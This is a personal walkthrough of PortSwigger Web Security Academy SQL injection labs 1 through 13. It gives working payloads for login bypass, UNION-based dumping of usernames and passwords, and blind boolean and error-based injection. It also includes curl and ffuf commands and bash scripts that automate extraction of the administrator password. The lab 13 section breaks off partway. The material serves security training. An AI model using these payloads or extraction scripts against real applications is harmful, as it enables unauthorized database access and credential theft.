---
created: 2026-04-19
tags:
  - walkthrough
  - SQL
---
>[!note]+ Labs are numbered as per order in [the list of SQL injection labs](https://portswigger.net/web-security/all-labs#sql-injection).

| `#`   | Solved? | Name                                                                                  | Notes                      |
| ----- | ------- | ------------------------------------------------------------------------------------- | -------------------------- |
| `1.`  | `✓`     | SQL injection vulnerability in `WHERE` clause allowing retrieval of hidden data       |                            |
| `2.`  | `✓`     | SQL injection vulnerability allowing login bypass                                     |                            |
| `3.`  | `✓`     | SQL injection attack, querying the database type and version on Oracle<br>            |                            |
| `4.`  | `✓`     | SQL injection attack, querying the database type and version on MySQL and Microsoft   |                            |
| `5.`  | `✓`     | SQL injection attack, listing the database contents on non-Oracle databases           |                            |
| `6.`  | `✓`     | SQL injection attack, listing the database contents on Oracle                         |                            |
| `7.`  | `✓`     | SQL injection `UNION` attack, determining the number of columns returned by the query |                            |
| `8.`  | `✓`     | SQL injection `UNION` attack, finding a column containing text<br>                    |                            |
| `9.`  | `✓`     | SQL injection `UNION` attack, retrieving data from other tables                       |                            |
| `10.` | `✓`     | SQL injection `UNION` attack, retrieving multiple values in a single column           |                            |
| `11.` | `✓`     | Blind SQL injection with conditional responses                                        | #revision                  |
| `12.` | `✓`     | Blind SQL injection with conditional errors                                           | #revision                  |
| `13.` | `✓`     | Visible error-based SQL injection                                                     | #revision                  |
| `14.` | `✓`     | Blind SQL injection with time delays                                                  |                            |
| `15.` | `✓`     | Blind SQL injection with time delays and information retrieval<br>                    |                            |
| `16.` | `✓`     | Blind SQL injection with out-of-band interaction<br>                                  | #Collaborator<br>#revision |
| `17.` | `✓`     | Blind SQL injection with out-of-band data exfiltration                                | #Collaborator              |
| `18.` | `✓`     | SQL injection with filter bypass via XML encoding<br>                                 |                            |

## 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

>[!done]

>[!note]+ Lab description
> - [`Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data`](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
> - Level: #Apprentice
> 
> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
> 
> ```SQL
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
> ```
> 
> To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

### Solution

- Filtering by categories gives the following URL:

```
https://0abc00ca04ed4b7d847b65a900dc0091.web-security-academy.net/filter?category=Gifts
```

- To test for SQL injection, inject a single quote `'` (URL-encoded `%27`) at the end of the query:

```
https://0abc00ca04ed4b7d847b65a900dc0091.web-security-academy.net/filter?category=Gifts%27
```

![[2.png]]

- `Internal Server Error` -> good sign; likely occurred due to syntax errors in the SQL query.

- Inject `' OR 1=1--` to remove any conditions after the injection point (`released = 1`) so to display all products, including unreleased ones:

```bash
https://0abc00ca04ed4b7d847b65a900dc0091.web-security-academy.net/filter?category=Gifts%27%20OR%201=1--
```

![[images/walkthrough/PortSwigger/SQLi/lab1/solved.png]]

Solved!
## 2. Lab: SQL injection vulnerability allowing login bypass

>[!done]

>[!note]+ Lab description
> - [`Lab: SQL injection vulnerability allowing login bypass`](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
> - Level: #Apprentice 
> 
> This lab contains a SQL injection vulnerability in the login function.
> 
> To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

### Solution

- Navigate to `My account` to see the login form:

![[images/walkthrough/PortSwigger/SQLi/lab2/1.png]]

- Test the login functionality first; the `POST` request looks like this:

```HTTP
POST /login HTTP/2
Host: 0ac2004c0485ed4281675cdc009100f1.web-security-academy.net
Cookie: session=piZ5fvjCfBaV5swRFKOZNsRwnL7gr6xy
Content-Length: 67
<SNIP>

csrf=s94BIa46l3YUZT06bNeDJXtuvLW2a95v&username=admin&password=admin
```

- Try a simple bypass — commenting out the password check:
	- Username: `admin' OR 1=1--`
	- Password: `anything`

```HTTP
POST /login HTTP/2
Host: 0ac2004c0485ed4281675cdc009100f1.web-security-academy.net
Cookie: session=piZ5fvjCfBaV5swRFKOZNsRwnL7gr6xy
Content-Length: 86
Cache-Control: max-age=0
<SNIP>

csrf=s94BIa46l3YUZT06bNeDJXtuvLW2a95v&username=admin%27+OR+1%3D1--+&password=anything
```

- This successfully logs you in as `admin`:

![[solved.png]]

Solved!
## 3. Lab: SQL injection attack, querying the database type and version on Oracle

>[!done]

>[!note]+ Lab description
> - [`Lab: SQL injection attack, querying the database type and version on Oracle`](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
> - Level: #Practitioner
> 
> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> 
> To solve the lab, display the database version string.

### Solution

![[images/walkthrough/PortSwigger/SQLi/lab3/1.png]]

- Adding `'` at the end of a category filter causes `Internal Server Error`:

```bash
https://0a39008f03ea2f2380b00df600e100a5.web-security-academy.net/filter?category=Gifts%27
```

- Test for a `UNION`-based SQL injection. For example, `UNION SELECT` two `NULL` columns (since it's Oracle, `SELECT` must have `FROM` — use `DUAL` for this purpose):

```SQL
' UNION SELECT NULL,NULL FROM DUAL--
```

```
https://0a39008f03ea2f2380b00df600e100a5.web-security-academy.net/filter?category=Gifts%27UNION%20SELECT%20NULL,NULL%20FROM%20DUAL--
```

![[images/walkthrough/PortSwigger/SQLi/lab3/2.png]]

- Determine which of the columns is of a string type (in this case, apparently both, but check anyway):

```SQL
' UNION SELECT 'a',NULL FROM DUAL--
```

```
https://0a39008f03ea2f2380b00df600e100a5.web-security-academy.net/filter?category=Gifts%27UNION%20SELECT%20%27a%27,NULL%20FROM%20DUAL--
```

![[3.png]]

- To query database version in Oracle, select `banner` from `v$version` or `version` from `v$instance`

```SQL
' UNION SELECT banner,NULL FROM v$version--
```

![[4.png]]

![[images/walkthrough/PortSwigger/SQLi/lab3/solved.png]]

Solved!

## 4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

>[!done]

>[!note]+ Lab description
> - [`Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft`](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
> - Level: #Practitioner 
> 
> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> 
> To solve the lab, display the database version string.

### Solution

- The lab is similar to the previous one. Appending `'` to the category filter value gives `500 Internal Server Error`:

```bash
https://0a42005804be9d01810307bb00fd0029.web-security-academy.net/filter?category=Gifts%27
```

- Using the same method as before, determine the number of columns returned by the original `SELECT` query (there are 2):

```SQL
' UNION SELECT NULL,NULL-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab4/1.png]]


- Then determine which columns accept strings (both in this case):

```SQL
' UNION SELECT 'a','a'-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab4/2.png]]

- Attempt to retrieve the database version using:

```SQL
' UNION SELECT version(),'a'-- -
```

Or

```SQL
' UNION SELECT @@version,'a'-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab4/solved.png]]

Solved!
## 5. Lab: SQL injection attack, listing the database contents on non-Oracle databases

>[!done]

>[!note]+ Lab description
> - [`Lab: SQL injection attack, listing the database contents on non-Oracle databases`](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
> - Level: #Practitioner 
> 
> 
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> 
> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
> 
> To solve the lab, log in as the administrator user.


### Solution

- As before, the category filter is vulnerable to `UNION`-based SQL injection. The original `SELECT` statement selects two columns, and both accept strings:

```SQL
' UNION SELECT 'a','a'-- -
```


![[images/walkthrough/PortSwigger/SQLi/lab5/1.png]]

- Using the following query, it is possible to list table names in the current database:

```SQL
' UNION SELECT 'a',table_name FROM information_schema.tables-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab5/2.png]]

- From table names, we can infer it's PostgreSQL.

- To find users tables, use this query (table and column names are appended with random characters so you need to go through all steps):

```SQL
' UNION SELECT 'a',table_name FROM information_schema.tables WHERE table_name LIKE 'users%'-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab5/3.png]]

- In this case it's `users_pegqzs`.


- List columns:

```SQL
' UNION SELECT column_name,'a' FROM information_schema.columns WHERE table_name='users_pegqzs'-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab5/4.png]]

- From the output:
	- Username column: `username_jolpkk`
	- Password column: `password_coctmm`


- Now you can retrieve the credentials:

```SQL
' UNION SELECT username_jolpkk,password_coctmm FROM users_pegqzs-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab5/5.png]]

- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/SQLi/lab5/solved.png]]

Solved!

## 6. Lab: SQL injection attack, listing the database contents on Oracle

>[!done]

>[!note]+
> - [`Lab: SQL injection attack, listing the database contents on Oracle`](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
> - Level: #Practitioner 
> 
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> 
> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
> 
> To solve the lab, log in as the administrator user.

### Solution

- From the start, we know it's Oracle. Same as before, the category filter is vulnerable to `UNION`-based SQL injection. 
- However, the error will disappear only if you add `FROM dual` to the `UNION`-ed query:

```SQL
' UNION SELECT 'a','a' FROM dual-- -
```

- Two columns are returned by the original query, and both accept strings.

![[images/walkthrough/PortSwigger/SQLi/lab6/1.png]]

- On Oracle, to list tables, run:


```SQL
' UNION SELECT 'a',table_name FROM all_tables-- -
```

- In the output, find `USERS_` table: `USERS_XFQKAQ`

![[images/walkthrough/PortSwigger/SQLi/lab6/2.png]]

- The next step is to retrieve column names:

```SQL
' UNION SELECT 'a',column_name FROM user_tab_columns WHERE table_name='USERS_XFQKAQ'-- 
```

![[images/walkthrough/PortSwigger/SQLi/lab6/3.png]]


- From the output:
	- Username column: `USERNAME_AGDAED`
	- Password column: `PASSWORD_ORCDDR`

- Retrieve credentials with:

```SQL
' UNION SELECT USERNAME_AGDAED,PASSWORD_ORCDDR FROM USERS_XFQKAQ-- 
```

![[images/walkthrough/PortSwigger/SQLi/lab6/4.png]]

- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/SQLi/lab6/solved.png]]

Solved!
## 7. Lab: SQL injection UNION attack, determining the number of columns returned by the query

>[!done]

>[!note]+ Lab description
>- [`Lab: SQL injection UNION attack, determining the number of columns returned by the query`](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
>- Level: #Practitioner 
>
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
> 
> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

### Solution

- Filtering by category gives the following URL:

```
https://0ae5005d04da679581f139b5000c001f.web-security-academy.net/filter?category=Lifestyle
```

- Adding `'` at the end of a category filter causes `Internal Server Error`:

```bash
https://0ae5005d04da679581f139b5000c001f.web-security-academy.net/filter?category=Lifestyle%27
```

![[images/walkthrough/PortSwigger/SQLi/lab7/1.png]]


- To confirm an in-band SQL injection, inject `' OR 1=1--`:


```bash
Lifestyle'%20OR%201%3d1--
```

![[images/walkthrough/PortSwigger/SQLi/lab7/2.png]]

- Attempting a `UNION`-based attack, inject:

```SQL
Lifestyle' UNION SELECT NULL,NULL-- 
```

```SQL
Lifestyle%27%20UNION%20SELECT%20NULL%2cNULL--
```

![[images/walkthrough/PortSwigger/SQLi/lab7/3.png]]

- Increasing the number of columns to three removes the error, which means the `UNION` query becomes valid. This means the target number of columns is 3.

```SQL
Lifestyle' UNION SELECT NULL,NULL,NULL-- 
```

```SQL
Lifestyle%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL--
```

![[images/walkthrough/PortSwigger/SQLi/lab7/solved.png]]

Solved!
## 8. Lab: SQL injection UNION attack, finding a column containing text

>[!done]

>[!note]+ Lab description
> - [`Lab: SQL injection UNION attack, finding a column containing text`](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
> - Level: #Practitioner 
> 
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.
>
>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

### Solution

- Appending a single quote to the `category` parameter value gives `Internal Server Error`:

![[images/walkthrough/PortSwigger/SQLi/lab8/1.png]]

- Using the `NULL` method, discover the number of selected columns for the `UNION` attack:

```SQL
Gifts' UNION SELECT NULL,NULL,NULL--
```

```SQL
Gifts'%20UNION%20SELECT%20NULL%2cNULL%2cNULL--
```

![[images/walkthrough/PortSwigger/SQLi/lab8/2.png]]

- To determine which column can carry string values, replace each `NULL` with the test string, such as `'a'`, and see if an error occurs:

```SQL
Gifts' UNION SELECT 'a',NULL,NULL-- # error
Gifts' UNION SELECT 'a',NULL,NULL-- # valid
Gifts' UNION SELECT 'a',NULL,NULL-- # error
```

![[images/walkthrough/PortSwigger/SQLi/lab8/3.png]]

![[images/walkthrough/PortSwigger/SQLi/lab8/4.png]]

- Replacing the second `NULL` with `'a'` gives a valid response from the application, and that `a` appears on the page. This means the second columns is of the string type.

- To solve the lab, replace `a` with the text written in the lab header:

```SQL
Gifts' UNION SELECT NULL,'NMsAyo',NULL--
```

```SQL
Gifts'%20UNION%20SELECT%20NULL%2c'NMsAyo'%2cNULL--
```


![[images/walkthrough/PortSwigger/SQLi/lab8/solved.png]]

Solved!
## 9. Lab: SQL injection UNION attack, retrieving data from other tables

>[!done]

>[!note]+ Lab description
>- [`Lab: SQL injection UNION attack, retrieving data from other tables`](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
>- Level: #Practitioner 
>
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
> 
> The database contains a different table called `users`, with columns called `username` and `password`.
> 
> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

### Solution

- Following the pattern similar to the previous labs, identify a `UNION` SQL injection attack, determine the number of columns returned by the original `SELECT` statement, and columns containing string data:

```SQL
Gifts' UNION SELECT 'a','a'-- -
```

```SQL
Gifts'%20UNION%20SELECT%20'a'%2c'a'--%20-
```

From the responses, identify that the number of columns returned is 2, and that both columns return string data.

- Using the following query, list tables in the current database:

```SQL
Gifts' UNION SELECT 'a',table_name FROM information_schema.tables-- - 
```

```SQL
Gifts'%20UNION%20SELECT%20'a'%2ctable_name%20FROM%20information_schema.tables--%20-
```

![[images/walkthrough/PortSwigger/SQLi/lab9/2.png]]

- Based on the returned table names, you can be sure it is a PostgreSQL database.
- To filter results and find the `users` table, run:

```SQL
Gifts' UNION SELECT 'a',table_name FROM information_schema.tables WHERE table_name LIKE '%users%'-- - 
```

```SQL
Gifts'%20UNION%20SELECT%20'a'%2ctable_name%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20'%25users%25'--%20-%20
```

![[images/walkthrough/PortSwigger/SQLi/lab9/3.png]]

- To list available columns, use:

```SQL
Gifts' UNION SELECT 'a',column_name FROM information_schema.columns WHERE table_name='users'-- -
```

```SQL
Gifts'%20UNION%20SELECT%20'a'%2ccolumn_name%20FROM%20information_schema.columns%20WHERE%20table_name%3d'users'--%20-
```

![[images/walkthrough/PortSwigger/SQLi/lab9/4.png]]


- To retrieve usernames and passwords, change the query to:

```SQL
Gifts' UNION SELECT username,password FROM users-- -
```

```SQL
Gifts'%20UNION%20SELECT%20username%2cpassword%20FROM%20users--%20-
```

![[5.png]]

- From the results, find user `administrator` and their password. Copy the value and login.

![[images/walkthrough/PortSwigger/SQLi/lab9/solved.png]]

Solved!
## 10. Lab: SQL injection UNION attack, retrieving multiple values in a single column

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: SQL injection UNION attack, retrieving multiple values in a single column`](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
> - Level: #Practitioner 
> 
> 
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> 
> The database contains a different table called `users`, with columns called `username` and `password`.
> 
> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

### Solution

- Using methods described in the previous labs, determine the number of selected columns (`2`) and which column returns text data (only the second). 
- Use the following query to retrieve column names of the `users` table:

```SQL
Lifestyle' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
```

```SQL
Lifestyle'%20UNION%20SELECT%20NULL%2ccolumn_name%20FROM%20information_schema.columns%20WHERE%20table_name%3d'users'--%20-
```

![[images/walkthrough/PortSwigger/SQLi/lab10/1.png]]

- To retrieve both `username` and `password` column values using just one string column, concatenate them:


```SQL
Lifestyle' UNION SELECT NULL,username || '~' || password FROM users-- -
```

```SQL
Lifestyle'%20UNION%20SELECT%20NULL%2cusername%20%7c%7c%20'~'%20%7c%7c%20password%20FROM%20users--%20-
```

![[images/walkthrough/PortSwigger/SQLi/lab10/2.png]]

- Copy the administrator's password and log in:

![[images/walkthrough/PortSwigger/SQLi/lab10/solved.png]]

Solved!
## 11. Lab: Blind SQL injection with conditional responses

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
> - [`Lab: Blind SQL injection with conditional responses`](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
> - Level: #Practitioner 
> 
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
> 
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
> 
> To solve the lab, log in as the `administrator` user.

z### Solution

- Navigating to the main page of the lab and catching the request in HTTP history, we see:

![[images/walkthrough/PortSwigger/SQLi/lab11/1.png]]

- The application uses a `TrackingId` cookie. Let's test it for the injection. 
- Send the request to repeater and add a single quote:

```SQL
TrackingId=UV6LitSfVxlLaO43'
```

![[images/walkthrough/PortSwigger/SQLi/lab11/2.png]]

- The response is almost the same — only the length has changed, from `11,670` bytes (`Length` column in HTTP history) to `11,609`. 
- Inspecting carefully, we notice that with a backtick, there's no `Welcome back!` on the home page as we see with a backtick.
- Append an always-true condition, and the application sends `Welcome back!` again:

```SQL
TrackingId=UV6LitSfVxlLaO43' AND '1'='1
```

![[images/walkthrough/PortSwigger/SQLi/lab11/3.png]]

- Change it to false, and have no greeting:

```SQL
TrackingId=UV6LitSfVxlLaO43' AND '1'='0
```

![[images/walkthrough/PortSwigger/SQLi/lab11/4.png]]

- This confirms a blind boolean-based SQL injection.

- Try to extract data:

```SQL
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
```

```bash
curl -s -k 'https://0aec003f041d327b810e2a070059005e.web-security-academy.net/'   -b "TrackingId=UV6LitSfVxlLaO43' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a; session=2pOFCSp5aUlhx03q8LzONvlBjwbeFcG1" | grep -o 'Welcome back!'
Welcome back!
```

```bash
 curl -s -k 'https://0aec003f041d327b810e2a070059005e.web-security-academy.net/'   -b "TrackingId=UV6LitSfVxlLaO43' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a; session=2pOFCSp5aUlhx03q8LzONvlBjwbeFcG1" | grep -o 'Welcome back!'
Welcome back!
```

- Automate for one character:


```bash
ffuf -k -u 'https://0aec003f041d327b810e2a070059005e.web-security-academy.net/'   -b "TrackingId=UV6LitSfVxlLaO43' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='FUZZ; session=2pOFCSp5aUlhx03q8LzONvlBjwbeFcG1" -w chars.txt -mr "Welcome" -s
```
```bash
1
```

- All chars:

```bash
#!/bin/bash

URL="https://0aec003f041d327b810e2a070059005e.web-security-academy.net/"
COOKIE="TrackingId=UV6LitSfVxlLaO43"
SESSION="session=2pOFCSp5aUlhx03q8LzONvlBjwbeFcG1"

PASSWORD=""

for pos in $(seq 1 20); do
  echo -ne "[+] Position $pos: \t"

  CHAR=$(ffuf -k -s \
    -u "$URL" \
    -b "${COOKIE}' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,${pos},1)='FUZZ')='a; ${SESSION}" \
    -w chars.txt \
    -mr "Welcome" \
    | awk '{print $NF}')

  PASSWORD+=$CHAR
  echo "$CHAR"
done

echo "[+] Final password: $PASSWORD"
```

>[!tip]- Use this wordlist for fuzzing
> 
> ```bash
> a
> b
> c
> d
> e
> f
> g
> h
> i
> j
> k
> l
> m
> n
> o
> p
> q
> r
> s
> t
> u
> v
> w
> x
> y
> z
> 1
> 2
> 3
> 4
> 5
> 6
> 7
> 8
> 9
> 0
> ```

- Run:

```bash
bash script.sh
```

```bash
[+] Position 1: 	1
[+] Position 2: 	m
[+] Position 3: 	h
[+] Position 4: 	0
[+] Position 5: 	i
[+] Position 6: 	y
[+] Position 7: 	f
[+] Position 8: 	i
[+] Position 9: 	h
[+] Position 10: 	i
[+] Position 11: 	o
[+] Position 12: 	9
[+] Position 13: 	b
[+] Position 14: 	s
[+] Position 15: 	7
[+] Position 16: 	v
[+] Position 17: 	3
[+] Position 18: 	e
[+] Position 19: 	e
[+] Position 20: 	i
[+] Final password: 1mh0iyfihio9bs7v3eei
```

- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/SQLi/lab11/solved.png]]

Solved!
## 12. Lab: Blind SQL injection with conditional errors

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Blind SQL injection with conditional errors`](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
> - Level: #Practitioner 
> 
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
> 
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
> 
> To solve the lab, log in as the `administrator` user.

### Solution

Same as in the previous lab, the application uses a `TrackingId` cookie. A single quote appended to its value causes an `500 Internal Server Error` response:

![[images/walkthrough/PortSwigger/SQLi/lab12/1.png]]

- To make sure the error is caused by broken SQL syntax, append another quote and observe the error disappears:

![[images/walkthrough/PortSwigger/SQLi/lab12/2.png]]

- Try to `SELECT` an empty string to see if SQL queries are evaluated, so the previous error isn't caused by anything but SQL:

```SQL
'||(SELECT '')||'
```

![[images/walkthrough/PortSwigger/SQLi/lab12/3.png]]

- The error is still there, but this may be caused by the database type — Oracle requires `FROM DUAL` (before version `23c`):

```SQL
'||(SELECT '' FROM dual)||'
```

![[images/walkthrough/PortSwigger/SQLi/lab12/4.png]]

- Observe the error disappears — which means we're dealing with Oracle.
- If you inject an invalid query but preserve valid SQL syntax — such as selecting from a non-existing database — you'll still see an error:

![[images/walkthrough/PortSwigger/SQLi/lab12/5.png]]

- So, as long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database.
- This way, verify the `users` table exists:

```SQL
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

![[6.png]]

- No error -> the `users` table exists.

- Try to inject a conditional error:
- `true` -> error:

```SQL
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

![[7.png]]

- `false` -> no error:

```SQL
'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

![[8.png]]

- Now you can use this result to extract actual data, such as administrator's password length:

```SQL
'||(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' # true
'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' # false
'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' # true
```

![[9.png]]

- With this, you can then infer each password character one-by-one:

```bash
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- To automate the process, you can use `ffuf`:

```bash
ffuf -k -u 'https://0a290005048780c0805bcb4800dc004a.web-security-academy.net/'   -b "TrackingId=UoQpXu9UqNi1PXMk'||(SELECT CASE WHEN SUBSTR(password,1,1)='FUZZ' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=kclkFezAMWpK72frmktlfvnNMMJppz2p" -w chars.txt -mc 500 -s 
```
```
k
```


- All characters:

```bash
#!/bin/bash

URL="https://0a290005048780c0805bcb4800dc004a.web-security-academy.net/"
COOKIE="TrackingId=UoQpXu9UqNi1PXMk"
SESSION="session=kclkFezAMWpK72frmktlfvnNMMJppz2p"

PASSWORD=""

for pos in $(seq 1 20); do
  echo -ne "[+] Position $pos: \t"

  CHAR=$(ffuf -k -s \
    -u "$URL" \
    -b "${COOKIE}'||(SELECT CASE WHEN SUBSTR(password,${pos},1)='FUZZ' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; ${SESSION}" \
    -w chars.txt \
    -mc 500 \
    | awk '{print $NF}')

  PASSWORD+=$CHAR
  echo "$CHAR"
done

echo "[+] Final password: $PASSWORD"
```

>[!tip]- Use this wordlist for fuzzing
> 
> ```bash
> a
> b
> c
> d
> e
> f
> g
> h
> i
> j
> k
> l
> m
> n
> o
> p
> q
> r
> s
> t
> u
> v
> w
> x
> y
> z
> 1
> 2
> 3
> 4
> 5
> 6
> 7
> 8
> 9
> 0
> ```

- Run:

```bash
bash script.sh
```

```bash
[+] Position 1: 	k
[+] Position 2: 	i
[+] Position 3: 	4
[+] Position 4: 	a
[+] Position 5: 	9
[+] Position 6: 	v
[+] Position 7: 	c
[+] Position 8: 	c
[+] Position 9: 	n
[+] Position 10: 	s
[+] Position 11: 	c
[+] Position 12: 	1
[+] Position 13: 	3
[+] Position 14: 	e
[+] Position 15: 	4
[+] Position 16: 	g
[+] Position 17: 	i
[+] Position 18: 	q
[+] Position 19: 	s
[+] Position 20: 	u
[+] Final password: ki4a9vccnsc13e4giqsu
```


- Log in with the discovered credentials:

![[10.png]]

Solved!
## 13. Lab: Visible error-based SQL injection

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
>- [`Lab: Visible error-based SQL injection`](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
> 
> - Level: #Practitioner 
> 
> 
> This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
> 
> The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

### Solution

- Same as before, the application uses `TrackingId` cookie. Append a single quote to it — and you'll see `500 Internal Server Error`:

![[images/walkthrough/PortSwigger/SQLi/lab13/1.png]]

- The error says:

```SQL
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'rePjOJKl9nSKGO1k''. Expected  char
```

- Now we know it is an SQL query error.
- Add a comment after the quote to try to remove the error:

```SQL
'-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab13/2.png]]

- The error disappears. This means the query now is valid. 
- Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:

```bash
' AND CAST((SELECT 1) AS int)-- -
```

- `AND` requires a boolean condition, so the error says:

```SQL
ERROR: argument of AND must be type boolean, not type integer
  Position: 63
```

![[images/walkthrough/PortSwigger/SQLi/lab13/3.png]]

- Add comparison:

```bash
' AND 1=CAST((SELECT 1) AS int)-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab13/4.png]]

- But now, if you tried to convert a string to `int` (`(SELECT 'anything') AS int`), you'd see a cast error — that repeats the string:

```SQL
' AND 1=CAST((SELECT 'anything') AS int)-- -
```

```SQL
ERROR: invalid input syntax for type integer: "anything"
```

![[images/walkthrough/PortSwigger/SQLi/lab13/5.png]]

- Try to extract meaningful data from this:

```SQL
' AND 1=CAST((SELECT username FROM users) AS int)-- -
```

- The initial error occurs again:

```SQL
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'rePjOJKl9nSKGO1k' AND 1=CAST((SELECT username FROM users WHE'. Expected  char
```

![[images/walkthrough/PortSwigger/SQLi/lab13/6.png]]


- But this time, the query is truncated. The comment wasn't included, and therefore the error has occurred. 
- To stuff the query into the character limit, remove `TrackingId`:

```SQL
TrackingId=' AND 1=CAST((SELECT username FROM users AS int)-- -
```

- The error now says:

```SQL
ERROR: more than one row returned by a subquery used as an expression
```

![[images/walkthrough/PortSwigger/SQLi/lab13/7.png]]

- To fix it:

```SQL
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -
```

